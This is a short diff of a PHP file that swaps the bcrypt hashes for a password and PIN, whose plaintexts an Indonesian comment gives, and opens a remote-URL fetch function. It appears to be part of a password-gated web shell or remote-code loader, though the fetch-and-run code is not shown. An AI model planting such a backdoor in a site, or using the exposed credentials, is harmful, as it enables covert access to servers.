@@ -9,8 +9,8 @@ header('X-Powered-By: none');
 header('Content-Type: text/html; charset=UTF-8');
 
 // bcrypt dari 'rahasia123' dan '246810'
-$hashed_password = '$2a$12$C.O62qU8o.p/kbiR6jjjM..65NKkju1JElBfNNABL33xGzRlmsBlq';
-$hashed_pin      = '$2a$12$giamGNh7ZbumFRotqq93puGPZPxIFxsSky2lOwYk8YZyRMcRATcPS';
+$hashed_password = '$2a$12$i.a1PoeG37r/ey7xwEKahOvUagKRc0FFTlKyNrLXXr89V/cXnApq2';
+$hashed_pin      = '$2a$12$2bytpno5jJYCnWKxmZTy3OPtk0beVeyEpswq1VnAbSZyDU7PEmKqu';
 
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
